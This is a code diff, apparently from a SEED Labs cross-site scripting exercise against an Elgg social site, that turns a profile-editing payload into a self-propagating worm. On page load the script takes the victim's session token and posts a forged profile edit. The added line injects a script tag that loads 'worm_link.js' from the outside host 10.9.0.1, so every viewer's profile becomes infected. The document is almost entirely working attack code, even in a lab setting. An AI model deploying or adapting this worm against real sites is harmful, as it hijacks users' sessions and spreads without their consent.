@@ -5,10 +5,12 @@ window.onload = function () {
 	var token="&__elgg_token="+elgg.security.token.__elgg_token;
 	var sendurl="http://www.seed-server.com/action/profile/edit";
 	
-	var content="description=<p>MODIFIED!</p>"+ts+token+guid+userName;
+	var self_ref="<script type=\"text/javascript\" src=\"http://10.9.0.1:9875/worm_link.js\"></script>"
+	var content="description=<p>INFECTED!</p>"+self_ref+ts+token+guid+userName;
 	var samyGuid=59;
 	
 	if(elgg.session.user.guid!=samyGuid) {
+		alert('INFECTED!');
 		var Ajax=null;
 		Ajax=new XMLHttpRequest();
 		Ajax.open("POST", sendurl, true);
